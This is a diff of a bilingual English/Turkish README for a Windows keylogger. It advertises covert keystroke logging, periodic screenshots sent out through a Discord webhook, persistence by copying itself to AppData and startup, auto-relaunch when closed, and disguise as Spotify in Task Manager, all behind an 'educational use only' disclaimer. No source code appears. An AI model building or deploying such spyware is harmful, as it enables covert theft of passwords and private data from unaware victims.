@@ -1,59 +1,65 @@
-# Keylogger-Aku
-
-Keylogger-Aku is a stealthy Windows background application that captures keyboard input and screenshots, and reports them via a Discord webhook.
-
----
-
-## 🔧 Features
-
-- 🪪 **Stealth Mode:** Runs silently in the background without displaying a window or console.
-- ⌨️ **Keystroke Logging:** Records all keyboard inputs.
-- 🖥️ **Screenshot Capture:** Takes periodic screenshots (e.g., every 3 seconds).
-- ☁️ **Discord Webhook Reporting:** Sends captured data (keystrokes & screenshots) to a Discord webhook.
-- ⚙️ **Startup Autoload:** Automatically launches on system startup.
-- 🛑 **Task Manager Evasion:** Tries to remain hidden in Task Manager.
+<h1 align="center">🕵️‍♂️ AkuKeylogger</h1>
+<p align="center">Minimalist C++ system monitor & keylogger — for educational purposes only.</p>
 
 ---
 
-## 🖥️ Requirements
+## 🚀 Özellikler | Features
 
-- ✅ **Operating System:** Windows 10 or 11 (64-bit)
-- ✅ **Permissions:** Administrator privileges recommended for startup and stealth features
-- ✅ **Internet Connection:** Required to send data to the Discord webhook
-- ✅ **Visual C++ Redistributable:** May be required if built with Visual Studio
+- 🧠 **Klavye Kaydı**  
+  Türkçe: Klavyede basılan tuşları algılayarak kaydeder.  
+  English: Logs all keystrokes pressed on the keyboard.
 
----
+- 📸 **Ekran Görüntüsü**  
+  Türkçe: Her 10 saniyede bir ekran görüntüsü alır.  
+  English: Captures a screenshot every 10 seconds.
 
-## 🚀 How to Run
+- 💾 **Geçici Kayıt**  
+  Türkçe: Verileri sistemin geçici klasörüne (`Temp`) kaydeder.  
+  English: Stores data in the system's temporary folder (`Temp`).
 
-1. **Download** the executable from the [Releases](https://github.com/Aku-debug/Keylogger-Aku/releases/tag/c%2B%2B) page.
-2. **Double-click** `Aku1.4.3.v1.exe` to run.
-3. The application will:
-   - Start in the background
-   - Begin logging keystrokes
-   - Capture screenshots periodically
-   - Send data to the configured Discord webhook
-4. It will also **copy itself** to the system (e.g., `%AppData%`) and **add itself to Windows startup**.
+- 🌐 **Webhook Bildirimi**  
+  Türkçe: Verileri Discord Webhook üzerinden iletir.  
+  English: Sends logs and screenshots through Discord Webhook.
 
-> ℹ️ You will not see any window or icon. It is designed to remain completely hidden.
+- 📁 **Kalıcılık Sağlama**  
+  Türkçe: Kendini AppData'ya kopyalar, sistem başlangıcında çalışmak için ayarlanır.  
+  English: Copies itself to AppData and adds itself to Windows startup.
 
----
+- 🔁 **Oto-Yeniden Başlatma**  
+  Türkçe: Kapanırsa kendini otomatik olarak tekrar başlatır.  
+  English: Relaunches automatically if the process is closed.
 
-## ❗ Important Notes
+- 🕶️ **Gizli Çalışma**  
+  Türkçe: Konsol veya pencere göstermez.  
+  English: Runs silently with no visible window or console.
 
-- This software is intended **for educational and personal monitoring use only**.
-- Do **not** use this software on devices or systems you do not own or have legal permission to monitor.
-- Unauthorized surveillance is **illegal** in many jurisdictions and may lead to **criminal prosecution**.
-
----
-
-## 📦 Version
-
-**Current Version:** `v1.4.3`  
-**Release File:** `Aku1.4.3.v1.exe`
+- 🎵 **Maskeleme (Spotify)**  
+  Türkçe: Görev Yöneticisi'nde kendini **Spotify** gibi gösterir.  
+  English: Disguises itself as **Spotify** in Task Manager.
 
 ---
 
-## 📄 License
+## 🛠️ Derleme ve Çalıştırma | Build & Run
 
-This project is provided **without warranty**, and is intended for **ethical and educational use only**.
+1. **Visual Studio** ile açın.  
+   Open with **Visual Studio**.
+2. `Release` modunda derleyin.  
+   Build in `Release` mode.
+3. Çalıştırın — sistem dizinine kopyalanacak ve kendini başlatma için ayarlayacaktır.  
+   Run — it will copy itself to system directory and configure for auto-start.
+
+---
+
+## 📌 Kullanım Amacı | Purpose
+
+Bu yazılım **yalnızca eğitimsel ve test** amaçlıdır. İzinsiz kullanım **yasal değildir**.  
+This tool is for **educational and testing** purposes only. Unauthorized use is **illegal**.
+
+---
+
+## ⚠️ Uyarı | Disclaimer
+
+Yazılımın kötüye kullanımı durumunda doğabilecek sonuçlardan geliştirici sorumlu değildir.  
+The developer is **not responsible** for any misuse or resulting legal consequences.
+
+---
